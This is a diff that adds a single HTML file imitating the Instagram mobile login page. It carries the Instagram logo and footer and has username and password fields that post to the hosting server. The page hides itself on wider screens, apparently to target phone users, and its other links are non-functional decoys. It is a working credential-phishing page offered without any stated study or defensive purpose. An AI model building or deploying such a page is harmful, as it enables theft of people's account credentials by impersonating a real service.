@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        body{
+            height: 100vh;
+        }
+        form{
+            text-align: center ;
+            padding-top: 40px;
+        }
+        form img{
+            margin-bottom: 50px;
+        }
+        form input{
+            border: 1px solid rgba(128, 128, 128, 0.397);
+            border-radius: 5px;
+            margin: 2px 0px;
+            width: 60%;
+            padding: 10px;
+        }
+        #sub{
+            margin-top: 10px;
+            width: 66%;
+            height: 30px;
+            padding: 0px;
+            background: #0095f6;
+        }
+        #next{
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+        }
+        #or{
+            margin-top: 10px;
+            margin-bottom: 10px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+            color: grey;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+        }
+        .orx{
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+            color: rgb(74, 105, 207);
+            margin-top: 5px;
+        }
+        #imgget{
+            margin-left: 50%;
+            transform: translateX(-50%);
+        }
+        #btmc{
+            display: flex;
+            justify-content: center;
+            margin-top: 90px;
+        }
+        #btm{
+            color: grey;
+            padding: 0px 5px;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 13px;
+        }
+        @media screen and (min-width:550px){
+            body{
+                display: none;
+                background: black;
+            }
+        }
+    </style>
+</head>
+<body>
+    <form action="/" method="post">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png" height="70px" alt="">
+        <input type="text" name="unm" placeholder="Phone number, username or email">
+        <input type="password" name="pwd" placeholder="Password">
+        <input id="sub" type="submit" value="Log in">
+    </form>
+    <div id="next">
+        <span id="or">OR</span> <br>
+        <span style="display: flex;text-align: center; justify-content: center;">
+            <img src="https://logodix.com/logo/1058202.png" width="25px" alt="logo">
+            <span class="orx">Log in with Facebook</span>
+        </span>
+        
+        <span id="or" style="margin: 15px;font-weight: lighter; font-size: 14px; color: blue; font-family:auto;"> Forgot password?</span>
+        <span style="text-align: center; margin-top: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 14px;">Don't have an account?<span style="color: rgb(15, 152, 206); font-weight: bold;"> Sign up</span></span>
+        <span style="text-align: center; margin-top: 30px;">Get the app.</span>
+        <img src="https://www.seekpng.com/png/full/20-202991_get-it-on-google-play-logo-png-vector.png" height=85px; width="80%"  id="imgget" alt="get it">
+        <div id="btmc">
+            <span id="btm">Meta</span>
+            <span id="btm">About</span>
+            <span id="btm">Blog</span>
+            <span id="btm">Jobs</span>
+            <span id="btm">Help</span>
+            <span id="btm">API</span>
+            <span id="btm">Privacy</span>
+            <span id="btm">Terms</span>
+        </div>
+        <divi id="btmc" style="margin: 10px;">
+            <span id="btm">Top Accounts</span>
+            <span id="btm">Hashtags</span>
+            <span id="btm">Locations</span>
+            <span id="btm">Instagram Lite</span>
+        </div>
+        <divi id="btmc" style="margin: 15px;">
+            <span id="btm">English</span>
+            <span id="btm">© 2021 Instagram from Meta</span>
+        </div>
+    </div>
+
+</body>
+</html>
